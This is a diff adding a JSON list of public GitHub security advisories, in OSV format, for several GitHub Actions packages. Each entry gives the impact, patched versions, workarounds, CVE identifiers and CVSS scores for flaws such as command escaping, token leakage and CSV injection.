+                "url": "https://github.com/rlespinasse/github-slug-action/commit/102b1a064a9b145e56556e22b18b19c624538d94"
+            },
+            {
+                "type": "PACKAGE",
+                "url": "https://github.com/rlespinasse/github-slug-action"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/rlespinasse/github-slug-action/releases/tag/v4.4.1"
+            },
+            {
+                "type": "WEB",
+                "url": "https://securitylab.github.com/research/github-actions-untrusted-input"
+            }
+        ],
+        "affected": [
+            {
+                "package": {
+                    "name": "rlespinasse/github-slug-action",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "4.0.0"
+                            },
+                            {
+                                "fixed": "4.4.1"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/03/GHSA-6q4m-7476-932w/GHSA-6q4m-7476-932w.json"
+                }
+            }
+        ],
+        "schema_version": "1.6.0",
+        "severity": [
+            {
+                "type": "CVSS_V3",
+                "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+            }
+        ]
+    },
+    {
+        "id": "GHSA-p756-rfxh-x63h",
+        "summary": "Azure/setup-kubectl: Escalation of privilege vulnerability for v3 and lower",
+        "details": "### Impact\n\nThis vulnerability only impacts versions `v2` and lower. An insecure temporary creation of a file allows other actors on the Actions runner to replace the Kubectl binary created by this action because it is world writable. This Kubectl tool installer runs `fs.chmodSync(kubectlPath, 777)` to set permissions on the Kubectl binary, however, this allows any local user to replace the Kubectl binary. This allows privilege escalation to the user that can also run kubectl, most likely root. This attack is only possible if an attacker somehow breached the GitHub actions runner or if a user is utilizing an Action that maliciously executes this attack.\n\nNo impacted customers have been reported.\n\n### Patches\n\nThis has been fixed and released in all versions `v3` and later. 755 permissions are used instead.\n\n### Workarounds\n\nIf users absolutely cannot upgrade to `v3` or higher than they should be extra diligent of the other GitHub actions they are using in a workflow and ensure that their GitHub actions runner is secure.\n",
+        "aliases": [
+            "CVE-2023-23939"
+        ],
+        "modified": "2023-11-08T04:11:43.337197Z",
+        "published": "2023-03-07T20:07:27Z",
+        "database_specific": {
+            "cwe_ids": [
+                "CWE-732"
+            ],
+            "github_reviewed": true,
+            "severity": "LOW",
+            "github_reviewed_at": "2023-03-07T20:07:27Z",
+            "nvd_published_at": "2023-03-06T19:15:00Z"
+        },
+        "references": [
+            {
+                "type": "WEB",
+                "url": "https://github.com/Azure/setup-kubectl/security/advisories/GHSA-p756-rfxh-x63h"
+            },
+            {
+                "type": "ADVISORY",
+                "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-23939"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/Azure/setup-kubectl/commit/d449d75495d2b9d1463555bb00ca3dca77a42ab6"
+            },
+            {
+                "type": "PACKAGE",
+                "url": "https://github.com/Azure/setup-kubectl"
+            }
+        ],
+        "affected": [
+            {
+                "package": {
+                    "name": "Azure/setup-kubectl",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "0"
+                            },
+                            {
+                                "fixed": "3"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/03/GHSA-p756-rfxh-x63h/GHSA-p756-rfxh-x63h.json"
+                }
+            }
+        ],
+        "schema_version": "1.6.0",
+        "severity": [
+            {
+                "type": "CVSS_V3",
+                "score": "CVSS:3.1/AV:A/AC:H/PR:L/UI:N/S:C/C:N/I:L/A:N"
+            }
+        ]
+    },
+    {
+        "id": "GHSA-2c6m-6gqh-6qg3",
+        "summary": "Docker Command Escaping in the GitHub Actions Runner",
+        "details": "### Impact\n\nThe actions runner invokes the docker cli directly in order to run job containers, service containers, or container actions. A bug in the logic for how the environment is encoded into these docker commands was discovered that allows an input to escape the environment variable and modify that docker command invocation directly. Jobs that use [container actions](https://docs.github.com/en/actions/creating-actions/creating-a-docker-container-action), [job containers](https://docs.github.com/en/actions/using-jobs/running-jobs-in-a-container), or [service containers](https://docs.github.com/en/actions/using-containerized-services/about-service-containers) alongside untrusted user inputs in environment variables may be vulnerable.\n\n### Patches\nThe Actions Runner has been patched, both on `github.com` and hotfixes for GHES and GHAE customers. Please update to one of the following versions of the runner:\n- 2.296.2\n- 2.293.1\n- 2.289.4\n- 2.285.2\n- 2.283.4\n\nGHES and GHAE customers may want to patch their instance in order to have their runners automatically upgrade to these new runner versions.\n\n### Workarounds\nYou may want to consider removing any container actions, job containers, or service containers from your jobs until you are able to upgrade your runner versions.\n\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the actions runner](https://github.com/actions/runner)\n",
+        "aliases": [
+            "CVE-2022-39321"
+        ],
+        "modified": "2023-11-08T04:10:18.762623Z",
+        "published": "2022-10-25T19:54:27Z",
+        "database_specific": {
+            "cwe_ids": [
+                "CWE-78"
+            ],
+            "github_reviewed": true,
+            "severity": "HIGH",
+            "github_reviewed_at": "2022-10-25T19:54:27Z",
+            "nvd_published_at": "2022-10-25T17:15:00Z"
+        },
+        "references": [
+            {
+                "type": "WEB",
+                "url": "https://github.com/actions/runner/security/advisories/GHSA-2c6m-6gqh-6qg3"
+            },
+            {
+                "type": "ADVISORY",
+                "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39321"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/actions/runner/pull/2107"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/actions/runner/pull/2108"
+            },
+            {
+                "type": "PACKAGE",
+                "url": "https://github.com/actions/runner"
+            }
+        ],
+        "affected": [
+            {
+                "package": {
+                    "name": "actions/runner",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "2.294.0"
+                            },
+                            {
+                                "fixed": "2.296.2"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/10/GHSA-2c6m-6gqh-6qg3/GHSA-2c6m-6gqh-6qg3.json",
+                    "last_known_affected_version_range": "< 2.296.1"
+                }
+            },
+            {
+                "package": {
+                    "name": "actions/runner",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "2.290.0"
+                            },
+                            {
+                                "fixed": "2.293.1"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/10/GHSA-2c6m-6gqh-6qg3/GHSA-2c6m-6gqh-6qg3.json"
+                }
+            },
+            {
+                "package": {
+                    "name": "actions/runner",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "2.286.0"
+                            },
+                            {
+                                "fixed": "2.289.4"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/10/GHSA-2c6m-6gqh-6qg3/GHSA-2c6m-6gqh-6qg3.json"
+                }
+            },
+            {
+                "package": {
+                    "name": "actions/runner",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "2.284.0"
+                            },
+                            {
+                                "fixed": "2.285.2"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/10/GHSA-2c6m-6gqh-6qg3/GHSA-2c6m-6gqh-6qg3.json"
+                }
+            },
+            {
+                "package": {
+                    "name": "actions/runner",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "0"
+                            },
+                            {
+                                "fixed": "2.283.4"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/10/GHSA-2c6m-6gqh-6qg3/GHSA-2c6m-6gqh-6qg3.json"
+                }
+            }
+        ],
+        "schema_version": "1.6.0",
+        "severity": [
+            {
+                "type": "CVSS_V3",
+                "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+            }
+        ]
+    },
+    {
+        "id": "GHSA-f9qj-7gh3-mhj4",
+        "summary": "run-terraform allows for RCE via terraform plan",
+        "details": "### Impact\n_What kind of vulnerability is it? Who is impacted?_  \nAll users of the `run-terraform` reusable workflow from the kartverket/github-workflows repo are affected. A malicious actor could potentially send a PR with a malicious payload leading to execution of arbitrary JavaScript code in the context of the workflow.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_  \nUpgrade to at least 2.7.5 to resolve the issue.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_  \nUntil you are able to upgrade, make sure to review any PRs from exernal users for malicious payloads before allowing them to trigger a build.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [kartverket/github-workflows](https://github.com/kartverket/github-workflows)\n",
+        "aliases": [
+            "CVE-2022-39326"
+        ],
+        "modified": "2023-11-08T04:10:19.005951Z",
+        "published": "2022-10-19T18:54:28Z",
+        "database_specific": {
+            "cwe_ids": [
+                "CWE-94"
+            ],
+            "github_reviewed": true,
+            "severity": "HIGH",
+            "github_reviewed_at": "2022-10-19T18:54:28Z",
+            "nvd_published_at": "2022-10-25T17:15:00Z"
+        },
+        "references": [
+            {
+                "type": "WEB",
+                "url": "https://github.com/kartverket/github-workflows/security/advisories/GHSA-f9qj-7gh3-mhj4"
+            },
+            {
+                "type": "ADVISORY",
+                "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39326"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/kartverket/github-workflows/pull/19"
+            },
+            {
+                "type": "PACKAGE",
+                "url": "https://github.com/kartverket/github-workflows"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/kartverket/github-workflows/releases/tag/v2.7.5"
+            }
+        ],
+        "affected": [
+            {
+                "package": {
+                    "name": "kartverket/github-workflows",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "0"
+                            },
+                            {
+                                "fixed": "2.7.5"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/10/GHSA-f9qj-7gh3-mhj4/GHSA-f9qj-7gh3-mhj4.json"
+                }
+            }
+        ],
+        "schema_version": "1.6.0",
+        "severity": [
+            {
+                "type": "CVSS_V3",
+                "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+            }
+        ]
+    },
+    {
+        "id": "GHSA-4xqx-pqpj-9fqw",
+        "summary": "gajira-create GitHub action vulnerable to arbitrary code execution",
+        "details": "### Impact\nAn attacker can execute arbitrary code in the context of a GitHub runner by creating a specially crafted GitHub issue.\n\n### Patches\nThis issue is patched in gajira-create version 2.0.1.\n\n### Workarounds\nThere are no known workarounds.\n\n### References\n[GitHub Security Lab advisory GHSL-2020-172](https://securitylab.github.com/advisories/GHSL-2020-172-gajira-create-action)",
+        "aliases": [
+            "CVE-2020-14188"
+        ],
+        "modified": "2023-11-08T04:02:25.493555Z",
+        "published": "2022-10-07T07:20:57Z",
+        "database_specific": {
+            "cwe_ids": [],
+            "github_reviewed": true,
+            "severity": "CRITICAL",
+            "github_reviewed_at": "2022-10-07T07:20:57Z",
+            "nvd_published_at": "2020-11-09T22:15:00Z"
+        },
+        "references": [
+            {
+                "type": "WEB",
+                "url": "https://github.com/atlassian/gajira-create/security/advisories/GHSA-4xqx-pqpj-9fqw"
+            },
+            {
+                "type": "ADVISORY",
+                "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-14188"
+            },
+            {
+                "type": "PACKAGE",
+                "url": "https://github.com/atlassian/gajira-create"
+            }
+        ],
+        "affected": [
+            {
+                "package": {
+                    "name": "atlassian/gajira-create",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "0"
+                            },
+                            {
+                                "fixed": "2.0.1"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/10/GHSA-4xqx-pqpj-9fqw/GHSA-4xqx-pqpj-9fqw.json"
+                }
+            }
+        ],
+        "schema_version": "1.6.0",
+        "severity": [
+            {
+                "type": "CVSS_V3",
+                "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+            }
+        ]
+    },
+    {
+        "id": "GHSA-634p-93h9-92vh",
+        "summary": "ghas-to-csv vulnerable to Improper Neutralization of Formula Elements in a CSV File",
+        "details": "### Impact\n\nThis GitHub Action creates a CSV file without sanitizing the output of the APIs.  If an alert is dismissed or any other custom field contains executable code / formulas, it might be run when an endpoint opens that CSV file in a spreadsheet program.  The data flow looks like this \ud83d\udc47\ud83c\udffb \n\n```mermaid\ngraph TD\n    A(Repository) -->|developer dismissal, other data input| B(GitHub Advanced Security data)\n    B -->|ghas-to-csv| C(CSV file)\n    C -->|spreadsheet program| D(endpoint executes potentially malicious code)\n```\n\n### Patches\n\nPlease use version `v1` or later.  That tag moves from using `csv` to `defusedcsv` to mitigate this problem.\n\n### Workarounds\n\nThere is no workaround.  Please upgrade to using the latest tag, `v1` (or later).\n\n### References\n\n* CWE-1236 information from [MITRE](https://cwe.mitre.org/data/definitions/1236.html)\n* CSV injection information from [OWASP](https://owasp.org/www-community/attacks/CSV_Injection)\n* CodeQL query for CWE-1236 in Python [here](https://github.com/github/codeql/tree/main/python/ql/src/experimental/Security/CWE-1236)\n* PyPI site for `defusedcsv` [here](https://pypi.org/project/defusedcsv/)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in this repository [here](https://github.com/some-natalie/ghas-to-csv/issues)\n",
+        "aliases": [
+            "CVE-2022-39217"
+        ],
+        "modified": "2023-11-08T04:10:15.184522Z",
+        "published": "2022-09-16T22:06:55Z",
+        "database_specific": {
+            "cwe_ids": [
+                "CWE-1236",
+                "CWE-74"
+            ],
+            "github_reviewed": true,
+            "severity": "MODERATE",
+            "github_reviewed_at": "2022-09-16T22:06:55Z",
+            "nvd_published_at": "2022-09-17T00:15:00Z"
+        },
+        "references": [
+            {
+                "type": "WEB",
+                "url": "https://github.com/some-natalie/ghas-to-csv/security/advisories/GHSA-634p-93h9-92vh"
+            },
+            {
+                "type": "ADVISORY",
+                "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39217"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/some-natalie/ghas-to-csv/issues/19"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/some-natalie/ghas-to-csv/pull/20"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/some-natalie/ghas-to-csv/commit/d0b521928fa734513b5cd9c7d9d8e09db50e884a"
+            },
+            {
+                "type": "PACKAGE",
+                "url": "https://github.com/some-natalie/ghas-to-csv"
+            }
+        ],
+        "affected": [
+            {
+                "package": {
+                    "name": "some-natalie/ghas-to-csv",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "0"
+                            },
+                            {
+                                "fixed": "1"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/09/GHSA-634p-93h9-92vh/GHSA-634p-93h9-92vh.json"
+                }
+            }
+        ],
+        "schema_version": "1.6.0",
+        "severity": [
+            {
+                "type": "CVSS_V3",
+                "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:L"
+            }
+        ]
+    },
+    {
+        "id": "GHSA-g86g-chm8-7r2p",
+        "summary": "check-spelling workflow vulnerable to token leakage via symlink attack",
+        "details": "### Impact\nFor a repository with the [check-spelling action](https://github.com/marketplace/actions/check-spelling) enabled that triggers on `pull_request_target` (or `schedule`), an attacker can send a crafted Pull Request that causes a `GITHUB_TOKEN` to be exposed.\n\nWith the `GITHUB_TOKEN`, it's possible to push commits to the repository bypassing standard approval processes. Commits to the repository could then steal any/all secrets available to the repository.\n\n### Workarounds\n\nYou can either:\n* [Disable the workflow](https://docs.github.com/en/actions/managing-workflow-runs/disabling-and-enabling-a-workflow) until you've fixed **all branches**.  \n\nor\n* Set repository to [Allow specific actions](https://docs.github.com/en/github/administering-a-repository/managing-repository-settings/disabling-or-limiting-github-actions-for-a-repository#allowing-specific-actions-to-run). You can check: \n   - [x] `Allow actions created by GitHub`\n   - [x] `Allow Marketplace actions by verified creators`\n\n[check-spelling](https://github.com/check-spelling) isn't a verified creator and it certainly won't be anytime soon. You could then explicitly add other actions that your repository uses.\n\nor\n* Set repository [Workflow permissions](https://docs.github.com/en/github/administering-a-repository/managing-repository-settings/disabling-or-limiting-github-actions-for-a-repository#setting-the-permissions-of-the-github_token-for-your-repository) to `Read repository contents permission`.\n\n### Solution\n\nWorkflows using `check-spelling/check-spelling@main` were fixed automatically with the release of [v0.0.19](https://github.com/check-spelling/check-spelling/releases/tag/v0.0.19).\n\nWorkflows using a pinned sha or tagged version will need to change the affected workflows for *all* repository branches to the latest version.\n\n#### The simple case\n\nIn the simple case, you have few enough open branches that you can do the following on **all branches**.\n\n- Edit the workflow to use `check-spelling/check-spelling@main`, or\n- Edit the workflow to use `check-spelling/check-spelling@v0.0.19`, or\n- Delete the workflow file, or\n- Change the workflow to only use `on: push`\n  - this will result in PRs losing status checks (commits will still have statuses)\n\n#### The complex case\n\nIf you have too many open branches to feasibly fix all of them as per the above, you can instead do the following:\n\n1. Perform the above solution on all open branches for which you need `check-spelling` to be active.\n2. On all open branches on which you need `check-spelling` to be active, rename the workflow file (e.g. to `spelling2.yml`)\n3. On the default branch, create a dummy workflow file with the old name (this is usually `spelling.yml`).\n4. Use the GitHub Actions UI to disable the workflow with the old name (this is usually `spelling.yml`).\n\nThis should prevent the vulnerable workflow from executing on any branches that you have not applied the proper solution to.\n\nThe reason for creating the dummy file (Step 3) before disabling the workflow (Step 4) is that, in our testing, GitHub may un-disable a workflow if it does not exist on your default branch.\n\nExample dummy workflow file (For step 3):\n\n```yml\n# spelling.yml is disabled per https://github.com/check-spelling/check-spelling/security/advisories/GHSA-g86g-chm8-7r2p\nname: Workflow should not run!\non:\n  push:\n    branches: ''\n\njobs:\n  placeholder:\n    name: Should be disabled\n    runs-on: ubuntu-latest\n    if: false\n    steps:\n    - name: Task\n      run: |\n        echo 'Running this task would be bad'\n        exit 1\n```\n\nYou *should also* include a comment in the new workflow to remind people not to resurrect the old name, for example:\n\n```yml\n# spelling.yml is disabled per https://github.com/check-spelling/check-spelling/security/advisories/GHSA-g86g-chm8-7r2p\n```\n\nFinally, you should consider sending a Pull Request to an open branch in which you have not performed the proper solution to verify that the old version of `check-spelling` does not execute.\n\n#### How to upgrade\n\nPerform this change to your impacted workflow file (typically `.github/workflows/spelling.yml`):\n```diff\n@@ -24 +24 @@\n-    - uses: check-spelling/check-spelling@v0.0.18\n+    - uses: check-spelling/check-spelling@v0.0.19\n```\n\nAs noted above, if you have many branches, you should additionally rename the workflow and include a comment to remind people not to use the old workflow file name:\n```\n# spelling.yml is blocked per https://github.com/check-spelling/check-spelling/security/advisories/GHSA-g86g-chm8-7r2p\n```\n\n### Reviewing workflow runs\n\nUsers can verify who and which Pull Requests have been running the action by looking up the spelling.yml action in the Actions tab of their repositories, e.g., https://github.com/check-spelling/check-spelling/actions/workflows/spelling.yml - you can filter PRs by adding `?query=event%3Apull_request_target`, e.g., https://github.com/check-spelling/check-spelling/actions/workflows/spelling.yml?query=event%3Apull_request_target.\n\n\n### References\n\n* For more information on `pull_request_target` attacks, see [GitHub Security Lab: Keeping your GitHub Actions and workflows secure: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)\n* For information on workflow hardening techniques, see [GitHub: Security hardening for GitHub Actions](https://docs.github.com/en/actions/learn-github-actions/security-hardening-for-github-actions)\n\n### Credit\nThanks to [@justinsteven](https://twitter.com/justinsteven) for reporting as well as in helping validate the fix.\n\n### For more information\n\nFor questions or comments about this advisory:\n* Email us at [check-spelling@check-spelling.dev](mailto:check-spelling@check-spelling.dev)",
+        "aliases": [
+            "CVE-2021-32724"
+        ],
+        "modified": "2023-11-08T04:05:58.483497Z",
+        "published": "2022-07-29T19:56:34Z",
+        "database_specific": {
+            "cwe_ids": [
+                "CWE-532"
+            ],
+            "github_reviewed": true,
+            "severity": "CRITICAL",
+            "github_reviewed_at": "2022-07-29T19:56:34Z",
+            "nvd_published_at": "2021-09-09T21:15:00Z"
+        },
+        "references": [
+            {
+                "type": "WEB",
+                "url": "https://github.com/check-spelling/check-spelling/security/advisories/GHSA-g86g-chm8-7r2p"
+            },
+            {
+                "type": "ADVISORY",
+                "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32724"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/check-spelling/check-spelling/commit/436362fc6b588d9d561cbdb575260ca593c8dc56"
+            },
+            {
+                "type": "PACKAGE",
+                "url": "https://github.com/check-spelling/check-spelling"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/check-spelling/check-spelling/releases/tag/v0.0.19"
+            }
+        ],
+        "affected": [
+            {
+                "package": {
+                    "name": "check-spelling/check-spelling",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "0"
+                            },
+                            {
+                                "fixed": "0.0.19"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/07/GHSA-g86g-chm8-7r2p/GHSA-g86g-chm8-7r2p.json"
+                }
+            }
+        ],
+        "schema_version": "1.6.0",
+        "severity": [
+            {
+                "type": "CVSS_V3",
+                "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N"
+            }
+        ]
+    },
+    {
+        "id": "GHSA-4mgv-m5cm-f9h7",
+        "summary": "Vault GitHub Action did not correctly mask multi-line secrets in output",
+        "details": "HashiCorp vault-action (aka Vault GitHub Action) before 2.2.0 allows attackers to obtain sensitive information from log files because a multi-line secret was not correctly registered with GitHub Actions for log masking.\n\nThe vault-action implementation did not correctly handle the marking of multi-line variables. As a result, multi-line secrets were not correctly masked in vault-action output.\n\nRemediation:\nCustomers using vault-action should evaluate the risk associated with this issue, and consider upgrading to vault-action 2.2.0 or newer. Please refer to https://github.com/marketplace/actions/hashicorp-vault for more information.",
+        "aliases": [
+            "CVE-2021-32074"
+        ],
+        "modified": "2024-01-25T19:58:46Z",
+        "published": "2022-05-24T19:01:50Z",
+        "database_specific": {
+            "github_reviewed_at": "2022-07-29T19:57:46Z",
+            "github_reviewed": true,
+            "severity": "HIGH",
+            "cwe_ids": [
+                "CWE-532"
+            ],
+            "nvd_published_at": "2021-05-07T05:15:00Z"
+        },
+        "references": [
+            {
+                "type": "ADVISORY",
+                "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32074"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/hashicorp/vault-action/issues/205"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/hashicorp/vault-action/pull/208"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/hashicorp/vault-action/commit/3526e1be65cf8faf42d6088bc5da8bff596c718a"
+            },
+            {
+                "type": "WEB",
+                "url": "https://discuss.hashicorp.com/t/hcsec-2021-13-vault-github-action-did-not-correctly-mask-multi-line-secrets-in-output/24128"
+            },
+            {
+                "type": "PACKAGE",
+                "url": "https://github.com/hashicorp/vault-action"
+            },
+            {
+                "type": "WEB",
+                "url": "https://github.com/hashicorp/vault-action/blob/master/CHANGELOG.md"
+            }
+        ],
+        "affected": [
+            {
+                "package": {
+                    "name": "hashicorp/vault-action",
+                    "ecosystem": "GitHub Actions"
+                },
+                "ranges": [
+                    {
+                        "type": "ECOSYSTEM",
+                        "events": [
+                            {
+                                "introduced": "0"
+                            },
+                            {
+                                "fixed": "2.2.0"
+                            }
+                        ]
+                    }
+                ],
+                "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/05/GHSA-4mgv-m5cm-f9h7/GHSA-4mgv-m5cm-f9h7.json"
+                }
+            }
+        ],
+        "schema_version": "1.6.0",
+        "severity": [
+            {
+                "type": "CVSS_V3",
+                "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+            }
+        ]
+    }
+]
